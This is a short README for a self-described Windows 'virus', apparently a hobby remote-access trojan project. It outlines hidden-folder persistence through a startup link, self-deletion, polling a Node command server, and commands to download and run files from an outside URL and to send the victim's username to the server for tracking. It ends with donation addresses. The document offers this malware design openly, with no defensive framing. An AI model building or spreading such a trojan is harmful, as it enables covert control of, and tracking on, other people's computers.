# Remote Tool / Virus
A Virus for Windows that listens to a node server for instructions


## Main Concept:
1. On start (if not already in the hidden folder) the program copys itself to a hidden folder, makes a link to itself in the startup folder, runs the copied version, then self deletes
2. Constantly tries to connect to a node server for instructions

## Built in commands
 * Download something from the internet eg. {download: "https://fosse.co/dl/mvm.exe"} (a simple ahk script that just moves the mouse 20px and then exits)
 * Run something (like that thing you downloaded from the internet, or anything else) eg. {execute: "mvm.exe"}
 * Send their username to the node server for tracking
 * Self Delete (for when things go wrong)




## Donate
  * If you like the project and would like to donate I have a paypal at matt.cfosse@gmail.com
  * BTC Address: 17hDC2X7a1SWjsqBJRt9mJb9fJjqLCwgzG
  * ETH Address: 0xFdcA914e1213af24fD20fB6855E89141DF8caF96